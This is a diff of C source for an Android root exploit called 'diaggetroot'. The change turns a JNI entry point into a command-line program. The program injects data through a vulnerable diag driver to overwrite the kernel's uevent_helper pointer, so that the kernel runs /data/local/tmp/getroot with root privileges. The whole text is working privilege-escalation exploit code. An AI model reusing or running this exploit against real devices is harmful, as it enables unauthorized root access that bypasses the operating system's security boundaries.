@@ -15,46 +15,60 @@
  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
  *
  */
-/*
- * Based on htcj_butterflay_diaggetroot.zip
- * <https://docs.google.com/file/d/0B8LDObFOpzZqQzducmxjRExXNnM/edit?pli=1>
- */
 #include <stdio.h>
 #include <stdint.h>
 #include <stdlib.h>
 #include <stdbool.h>
-#include <unistd.h>
-#include <jni.h>
 
 #include "libdiagexploit/diag.h"
 #include "common.h"
 
 static bool
-inject_getroot_command_with_fd(unsigned int uevent_helper_address,
-                               int fd)
+inject_getroot_command(unsigned int uevent_helper_address,
+                       const char *helper_command_path)
 {
   struct diag_values data[400];
   int data_length;
 
   data_length = prepare_injection_data(data, sizeof(data),
                                        uevent_helper_address,
-                                       "/data/local/tmp/" HELPER_COMMAND_NAME);
+                                       helper_command_path);
 
-  return diag_inject_with_fd(data, data_length, fd) == 0;
+  return diag_inject(data, data_length) == 0;
 }
 
-jboolean
-Java_com_example_diaggetroot_MainActivity_getrootnative(JNIEnv *env,
-                                                        jobject thiz,
-                                                        int fd)
+static void
+usage()
+{
+  printf("Usage:\n");
+  printf("\tdiaggetroot [uevent_helper address]\n");
+}
+
+int
+main(int argc, char **argv)
 {
   unsigned int uevent_helper_address;
-  uevent_helper_address = get_uevent_helper_address();
-  if (!uevent_helper_address) {
-    return JNI_FALSE;
+  bool success;
+
+  if (argc >= 2) {
+    uevent_helper_address = strtoul(argv[1], NULL, 16);
   }
 
-  return inject_getroot_command_with_fd(uevent_helper_address, fd);
+  if (!uevent_helper_address) {
+    uevent_helper_address = get_uevent_helper_address();
+    if (!uevent_helper_address) {
+      usage();
+      exit(EXIT_FAILURE);
+    }
+  }
+
+  success = inject_getroot_command(uevent_helper_address,
+                                   "/data/local/tmp/getroot");
+  if (!success) {
+    exit(EXIT_FAILURE);
+  }
+
+  exit(EXIT_SUCCESS);
 }
 /*
 vi:ts=2:nowrap:ai:expandtab:sw=2
